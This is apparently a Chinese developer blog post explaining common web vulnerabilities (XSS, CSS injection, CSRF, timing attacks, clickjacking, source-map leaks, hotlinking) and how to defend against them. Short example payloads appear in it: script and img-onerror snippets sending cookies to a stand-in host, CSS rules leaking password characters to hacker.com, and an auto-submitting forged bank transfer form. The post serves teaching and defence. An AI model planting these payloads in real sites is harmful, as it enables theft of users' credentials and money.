---
title: Web 安全常见问题与防御措施
date: 2021-07-02 15:00:00
tags: 
- Secure
- JS
- HTML
categories: 
- DOC
---

记录 Web 开发中常见的安全问题以及防御方法。



# XSS 跨站脚本攻击

考虑到以下场景：
论坛网站，因为帖子支持表情、特殊字体字号等，所以帖子使用 HTML，并以此提交后端、入库储存；
看帖的页面，直接使用服务端渲染的方式输出：

```jsp
<%= postContent %>
```

<br />

这是很常见的场景，例如 Discuz 论坛等都是这种形式，而这也正是 XSS 跨站脚本攻击诞生的背景。

考虑以下情况，某黑客发帖，内容如下：

```html
你好
<script>
  $.post({ url: 'https://example.com', data: document.cookie })
</script>
```

因为这一段 HTML 被直接插入页面中，任何访问这篇帖子的用户都会中招，导致 Cookie 被发送给恶意网站。
这种攻击方式简单直观，却很致命。

最初级的防御措施，是禁止任何 `<script>` 标签，但这解决不了问题，黑客可以换一种发帖内容：

```html
你好
<img 
  src="no"
  style="displaye: none;"
  onerror="$.post({ url: 'https://example.com', data: document.cookie })"
/>
```

只需要使用一个 `<img>` 类的标签，赋予一个不存在的资源，这样它的 `onerror` 必定触发，此时只需要把代码写在事件回调中即可。
虽然攻击方式还是一样的，但是，这种方式就很难防御了，毕竟想识别这种攻击代码比 `<script>` 标签要复杂多了。

此外，markdown 格式因为也支持使用 HTML 标签，所以也存在上述问题，如果相关业务支持 markdown，则也需要注重防御。

<br />

下面给出几种防御方式（建议全部一同使用）：

**使用 `innerText`、`textContent` 属性来展示用户内容。**

这两种属性不会导致输入内容被解析为 HTML 元素，因此可以安全的承接用户内容；而且 React、Vue 等工具内部也是利用了此原理，所以使用这些工具，也可以避免 XSS 攻击。

以上适用于纯文本的场景，如果需要支持用户设置文字样式、插入图片等复杂内容，请考虑使用富文本展示方案（可在 [PaperPlane Awesome](https://paperplane.cc/p/50388d702488/) 查找相关工具）。注意，常见的文本高亮这个功能，需要特别注意实现方式，不能图省事就用 `dangerouslySetInnerHTML` 或者 `v-raw` 来转为 HTML 标签。

-----

**滤除所有 `<script>` 、`<object>` 等危险标签，并滤出所有标签的 `"on"` 开头的所有属性。**

控制用户输入的内容并滤除非法内容，这也是一种防御方式。

可以使用 [`xss`](https://www.npmjs.com/package/xss) 这个包，它的被设计出的目的就是防御 XSS 攻击，此外它还支持白名单、自定义处理函数等功能。

-----

**使用 `httpOnly` 的 Cookie 避免泄露登录凭据。**

后端下发 Cookie 时，可以指定 `httpOnly=true` 属性，若如此做，这个 Cookie 无法通过 JS 访问。

这只是非常简单的防御方式，一旦 XSS 攻击达成，此方法仅能起到保护用户登录凭据的功能，但攻击者可以做很多事情，所以此方法只能作为最后一道防线，不能完全依赖它来防御 XSS 攻击。

-----

**使用 [CSP（内容安全策略）](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP) 设置 JS 白名单。**

设置的方式有两种：

第一种方式，配置服务器，使得 HTML 文档的 HTTP 响应带有以下响应头：

```
Content-Security-Policy: script-src 'self' https://example1.com https://example2.com;
```

这指定了所有脚本只能通过 `'self'`（当前同源）以及后面 2 个域名加载，域名可以指定多个；
只要 `script-src` 后面跟着的配置项不包含 `'unsafe-inline'`，那么网页便无法执行任何内联 `<script>`，同时标签字面量定义的任何事件回调也不会触发。可在 [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) 上查看 CSP 所有支持的响应头。

第二种方式，是使用 `<meta>` 标签，值和上面一样：

```html
<meta 
  http-equiv="Content-Security-Policy"
  content="script-src 'self' https://example1.com https://example2.com;"
/>
```

<br />

如果一定需要执行内联 `<script>` 标签的代码，可以在这个配置项中加上 `'nonce-随机令牌'`，此时，带有 `nonce="随机令牌"` 属性的内联代码的 `<script>` 依然可以执行。

这是最完善的解决方案，但是，它对页面的限制也是最大的。使用了这个策略后，每次引入第三方 JS 都需要配置 CSP，会导致开发部署流程更繁琐、服务端复杂度的增加。顺带一提，知乎已经开启了 CSP。



## 扩展：使用 URL 的攻击方式

这种攻击方式被称为 “反射式 XSS”。考虑以下场景：
某个搜索引擎网站，其搜索参数为 `?search=<搜索词>`，提交后搜索详情页有一处 DOM 会展示：`"当前搜索内容为：<搜索词>"`，这里的搜索词源自从 URL 中解析出的搜索词。这样类似的场景还有很多，不局限于搜索引擎类的站点。

![](../images/image-20240622010923502.png)

这样的页面设计，如果没有安全方面的意识，就会给恶意用户可乘之机。

如果页面上显示的搜索词直接来自服务端渲染，黑客则可以构建非法 URL；
例如：构造一个地址 `?search=%3Cscript%3E%3C%2Fscript%3E`，解析 URL 参数会得到 `"<script></script>"`，然后被服务器直接放入 HTML 中展现给浏览者，这个网页就具备了执行恶意代码的能力。
黑客在这对 `<script>` 标签中添加一些 JS 代码，并把这个 URL 发给其他用户，或伪造成超链接，骗取其他用户点击，这便会导致用户的隐私泄露。

这种反射型 XSS，防御起来也不难，除了使用上面的 CSP、安全过滤等方式来防御之外，还可以使用 `innerText`、`textContent` 的前端实现方式来展示这些内容。



## 扩展：CSS 也能注入攻击

有些网站允许用户自定义主题，用户可以插入自己的 CSS，实际上，CSS 也可以实现注入攻击，甚至比 XSS 更难防御。

例如，某类似 QQ 空间的网站为了支持自定义主题，允许用户上传 CSS，于是某恶意用户上传如下 CSS：

```css
input[value^='1'][type='password'] {
  background-image: url('https://hacker.com/?input=1');
}
input[value^='2'][type='password'] {
  background-image: url('https://hacker.com/?input=2');
}
/* ...各种字符组合 */
input[value^='11'][type='password'] {
  background-image: url('https://hacker.com/?input=11');
}
/* ...各种字符组合 */
input[value^='112'][type='password'] {
  background-image: url('https://hacker.com/?input=12');
}
/* ...各种字符组合 */
```

这样，只要任意用户访问别人的空间时，点击页面上的登录控件，注入的 CSS 就会对密码输入框生效，用户登录的密码前缀匹配这些规则，浏览器就会请求背景图对应的 URL，以此导致用户密码泄露。

此外，恶意用户可以利用 CSS 的 `:nth-child`、`:visited` 等伪类，达到窃取隐私的目的：

```css
a:nth-child(1):visited {
  background-image: url('https://hacker.com/?vi=1');
}
a:nth-child(2):visited {
  background-image: url('https://hacker.com/?vi=2');
}
a:nth-child(3):visited {
  background-image: url('https://hacker.com/?vi=3');
}
/* ... */
```

所以，网站如果想提供自定义 CSS，则需要对 CSS 内容进行识别判断，滤出其中所有非安全域名。
CSS 具备 `@import()` 引入其他样式表的能力，具备从 URL 加载背景图、加载字体（字体不能跨域）的能力，这些都要考虑到。

你也可以使用 CSP，但是它只能一次性设置网站加载所有图片的规则，不能单独针对某一个 CSS 设置：

```
Content-Security-Policy: img-src 'self' https://example1.com https://example2.com;
```

<br />

看到这里，你可能也意识到了，即使不允许自定义 CSS，只要网站允许用户使用 HTML 标签，那么恶意用户就可能通过在标签中添加 `style="background-image: url(...)"` 这种方式，实现窃取访客的隐私。

不过，可以使用 `xss` 来对用户的输入进行安全过滤，这个工具会剔除标签的 `style` 属性，避免出现上述问题。



# CSRF 跨站请求伪造

考虑如下场景：
某网银网站使用 Cookie 对用户进行鉴权，其有一个转账接口，假设接口是这样的：

```http
POST https://bank.com/api/transfer
```

参数：

```json
{
  amount: 10000,
  to_account: 123456
}
```

此时，某恶意用户自制一个网站，网站上放置以下内容：

```html
<form action="https://bank.com/api/transfer" method="POST" id="form">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="to_account" value="<黑客的账户>">
</form>
<script>
  document.getElementById('form').submit();
</script>
```

这样，用户访问黑客的网站时，如果曾经登录过网银，就会被转走一笔钱。
网上银行、投票类网站，通常会被作为 CSRF  攻击的重灾区，普通用户可能会被黑客利用，做出一些意料之外的操作。

此外，如果源站接口是 GET 请求，黑客甚至会使用 `<img src="" />` 这种方式就能完成攻击，这还可以配合一些防 XSS 机制不完善的网站，同时利用 XSS，此时甚至连构建表单都不需要。

**CSRF 攻击，利用的是浏览器会自动带上域名的 Cookie 发送请求，即使当前地址栏的 URL 和表单提交的 URL 不同源（这种场合又被称为 “跨站 Cookie”），这也是 “跨站请求伪造” 这个名称的来源。**CSRF 攻击有时也被成为 XSRF 攻击。

针对这个特性，我们可以使用以下预防措施：

最简单直观的方式是，**直接不使用 Cookie**。例如所有请求都使用 JS 在 `axios` 等请求工具里全局配置，每次请求从本地存储中提取 token 放置于请求头的 `Authorization` 字段中。因为 CSRF 是在黑客自己的网站上构建表单来提交，此时无法访问源站的本次存储，无法盗取用户的 token。

-----

浏览器也在跟进这类问题，因为跨站 Cookie 经常可以用来跟踪用户，例如广告 SDK 就可以利用广告商的 Cookie 来标识同一个用户，所以浏览器提出了第三方 Cookie 的限制策略。

服务端在下发 Cookie 时，可以添加一个属性 `SameSite`，值可以取：

- `Strict`，严格模式，只有在访问源站时才发发送此 Cookie，最安全；
- `Lax`，（默认）宽松模式，相比严格模式，在从第三方网站导航到源站时（例如点击链接），也会带上此 Cookie；其他场合仍会避免第三方 Cookie 被利用，此模式也是具备安全性的；
- `None` 并配置 `Secure`，**注意设置 `SameSite=none` 时必须配置 `Secure`（也就是此 Cookie 只在 HTTPS 请求时才能被设置），否则浏览器会报错，Cookie 也无法设置成功；**这是最不安全的设置，会导致 CSRF 攻击；浏览器现在已经默认不再是 `None` 了，不过早期浏览器可能不一定。

所以，下发 Cookie 时，可以设置其 `SameSite` 属性为 `Lax` 或 `Strict`，以此来避免 CSRF 攻击；当然也可以留空，让浏览器取默认值 `Lax`，不过早期的浏览器可能默认是 `None`，所以还是建议设置此值。

-----

我们也可以利用服务器渲染或者 JS，在表单中加入一些特定的标识符，例如：

```html
<input type="hidden" name="csrf_token" value="<校验字段>" />
```

这个标签需要由服务端直接渲染到表单里，或者通过 JS 放置，服务端收到提交后，就对字段 `csrf_token` 进行校验，以此判断请求是否合法。
这种方式需要对前端和后端进行改造，工作量可能会比较大。

此外，`axios` 也给我们提供了 `xsrfCookieName`（默认 `'XSRF-TOKEN'`）、`xsrfHeaderName` （默认 `'X-XSRF-TOKEN'`）配置项，用来对这种方式做兼容，它的做法是这样的：
只要服务端的响应带有 `XSRF-TOKEN` 键名的 Cookie，`axios` 就会把这个 Cookie 的值记录下来，后续请求都会在请求头里以 `X-XSRF-TOKEN: <之前记录的 Cookie>` 的形式携带这个值。



# 源站劫持或 CDN 劫持



原理：

常见来源：运营商或恶意软件

防御方式：HTTPS，CDN 可以使用 CSP



**防御：HSTS 和 OCSP 装订**

避免网站建立不安全的连接



**防御：CSP 内容安全策略**

避免网站资源被篡改



# 跨站跟踪

原理：rel，rel="nofollow/noreferrer/noopener"

防御方式：浏览器默认设置，组件库



原理：UGC 图片 url、字体 url

防御方式：转发，例如 Gmail、GitHub



# 旁路攻击

假设你的服务器使用以下方式判断用户是否存在：

```js
const user = await db.findUser(id)
if(!user) {
  throw new Error('请检查用户名和密码')
}
const hashedPassword = await hashUtil(id, password)
if(user.password !== hashedPassword) {
  throw new Error('请检查用户名和密码')
}
// ...
```

如果这里的 `hashUtil()` 是耗时操作，那么恶意用户可以使用一种名为 “计时攻击” 的方法，通过比对响应时间，来判断用户名是否存在，从而导致信息泄露。

密码比对算法，也会存在这类问题，假设密码比对采用 “逐字符比较” 的方式，则恶意用户可能根据响应的时间分析出前几位密码是正确的，以此不断尝试来试探出真实密码，这也是一种 “计时攻击”。

计时攻击是一种后端需要考虑的问题，例如密码比对可以使用哈希比对，数据库查询时可以带上密码一起查询，返回流程也可以手动加扰，以此来控制响应返回时间。

-----

此外，还有一种旁路攻击可以尝试用于突破 CORS 限制：
例如，某网站 `https://example.com` 不允许跨域，有一个敏感信息的接口 `https://example.com/api/userinfo`；
恶意用户可能利用 `<script>` 标签可以跨域的特性，构造以下代码：

```html
<script src="https://example.com/api/userinfo"></script>
```

或是

```html
<img src="https://example.com/api/userinfo" />
```

此时，因为是尝试加载 JS，不存在跨域限制，所以浏览器可以发出请求和拿到结果，虽然数据不是 JS 文件，会引发报错，但是恶意用户可能会从错误中得知一些信息，例如根据响应的时间实现计时攻击，造成信息泄露。

浏览器已经部署了 [CORB（跨站资源阻塞）](https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Cross-Origin_Resource_Policy) 来应对此类攻击。
具体而言，只要跨域请求的结果不符合请求的类型，例如通过 `<script>` 标签请求到了 JSON 这种情况，浏览器就会避免响应的信息被读取，将响应的内容替换为空，并从响应头中删除大部分 CORS 中规定的不安全的响应头。

浏览器综合检测响应的数据类型，利用 `Content-Type` 并嗅探检测响应的类型是否正确，如果触发了  CORB，还会避免内存或缓存读取任何响应结果的敏感内容。有关具体 CORB 的细节，可以阅读 [Chromium 的官方文档](https://chromium.googlesource.com/chromium/src/+/master/services/network/cross_origin_read_blocking_explainer.md)。



# iframe 安全

这里的 [`<iframe>`](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe) 指两种方式：自己网站嵌入其他网站，以及自己网站被嵌入的情况。

自己网站使用 `<iframe>` 嵌入第三方网站时，此时需要注意第三方网站有可能通过代码来调用浏览器的一些 API，可能会影响当前源站。
例如：第三方网站可能会打开弹出窗口、启动全屏模式等；此时，可以使用其 [`sandbox`](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe#sandbox) 属性。

`<iframe>` 的 [`sandbox`](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe#sandbox) 属性，只要一开启，子页面的所有权限均默认被禁止，此时必须通过一些属性来开启权限。
例如：配置 `sandbox="allow-popups"` 时，子页面的大部分权限都被禁止，但是允许使用弹出式窗口打开新页面。

-----

自己的网站有可能被嵌入其他网站中，导致产生例如点击劫持等安全问题。

浏览器会根据网站文档 HTTP 响应的 `X-Frame-Options` 来确定当前网站被嵌入 `<iframe>` 时的行为，它有以下取值：

- `DENY`，表示禁止任何嵌入行为；
- `SAMEORIGIN`，表示仅允许同源网站嵌入；
- `ALLOW-FROM <网址>`，表示仅允许特定网站嵌入。

为了避免自己的网站被别人恶意嵌入，建议设置 `X-Frame-Options: DENY` 响应头。

<br />

如果浏览器比较老，不支持上面这个配置，那么可以使用以下 JS 来防止网页被嵌入：

```js
if (window.top !== window.self) {
  window.top.location = window.location
}
```

<br />

还有一种方式，是利用 [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors) 来配置；参考以下 CSP 配置项：

```
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self';
Content-Security-Policy: frame-ancestors 'self' https://example1.com https://example2.com;
```

上面这三种配置，分别表示：禁止任何网站嵌入此页面、仅允许同源网站（`'self'`）嵌入本页面、仅允许同源网站和 `https://example1.com`、`https://example2.com` 两个网站嵌入此页面。



# 源码泄露

这里的源码泄露并不是指源代码真的被外人拿到了，而是指恶意用户可以通过一些手段获取或推导出源代码。

最直观的情况是，源码未经处理直接使用，此时恶意用户直接下载网站资源，就能获得所有 JS。我认为这种情况，很可能是原生开发小程序忘记勾选代码混淆了，或者是早期的 jQuery 之类的站点。因为现在的 SPA 网站，JS 代码都会使用 Webpack 打包编译，源码会被混淆（因为 Webpack 调用了 [Terser](https://terser.org/) 或 [Uglify.js](https://github.com/mishoo/UglifyJS)），很难从生产代码中还原出源代码。

但是，Webpack 打包后的代码包含了 SourceMap，如果我们直接复制 `/build` 或者 `/dist` 目录到部署机器上，这样部署后所有的 SourceMap 都是可访问的，恶意用户可以解析出源代码。

一种方法是，CI/CD 时直接跳过复制 SourceMap 文件（后缀 `.map`）。

或者，可以关闭生产环境的 SourceMap 输出，对于 cra 项目而言，配置 `GENERATE_SOURCEMAP=false` 变量或者把它写入 `.env`，对于 Vue 项目而言，配置 `productionSourceMap: false` 即可。

还有一种方式，是在 Nginx 配置中禁用 `.map` 后缀的文件，配置如下：

```nginx
location ~* \.map$ {
  allow 10.20.30.40;
  deny all;
}
```

这段配置只允许 IP 为 `10.20.30.40` 的客户端访问 `.map` 后缀的文件，把这个地址改成公司网络的公网 IP，即可实现只允许开发人员访问 SourceMap，方便定位线上错误，外部用户无法访问。

-----

还有一种情况，就是内网地址的泄露。
例如网站有一个预发布环境的配置，此时需要请求内网地址，这个内网地址需要写在代码里，此时打生产包就可能会把这个地址一起带上，导致泄露。

可以使用 `process.env.` 上的环境变量来标注当前是什么环境（启动时可使用 `dotenv` 来注入变量），使用 `if()` 进行环境的判断，决定是否启用内网地址；此时，打非当前环境的包时，Webpack 会自动删除这些条件无法满足的代码，避免内网地址被打包到生产环境。
例如：

```js
if(process.env.MODE === 'pre-prod') {
  // 非预发布场景打包时，这里面的代码会被剔除
}
```

-----

网站的依赖项，也有可能存在漏洞，出现严重漏洞时，恶意用户可能利用它来攻击网站。
因此，网站可能需要定期升级依赖包，以确保依赖包没有漏洞，避免被攻击。

GitHub 提供了 Dependency Review 机器人，可以执行 Actions 自动为我们检测存在漏洞的依赖项，并发布为 Issue；对于代码仓库，GitHub 提供了 “Security overview” 页面，可以配置自动检测漏洞、自动检测密钥泄露等，以此来提高源码的安全性。

即使不使用 GitHub，也可以使用类似 [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/) 的工具。



# 盗链

盗链是一种窃取 CDN 或对象存储服务流量的行为。

对于存储服务的防盗链，推荐将存储服务设置为私读私写，每次生成下载链接时，都生成带有时间戳和有效期的 URL，只允许用户在一段时间内下载。

图片资源和 JS 库资源的防盗链，建议在 CDN 厂商处配置域名白名单；
如果你没有使用 CDN，则可以配置 Nginx，给出一个图片防盗链的配置：

```nginx
location ~* \.(gif|jpg|jpeg|png|bmp|webp)$ {
  valid_referers none blocked *.your-domain.com server_names;

  # 如果验证不通过则返回 403
  if ($invalid_referer) {
    return 403;
  }
}
```

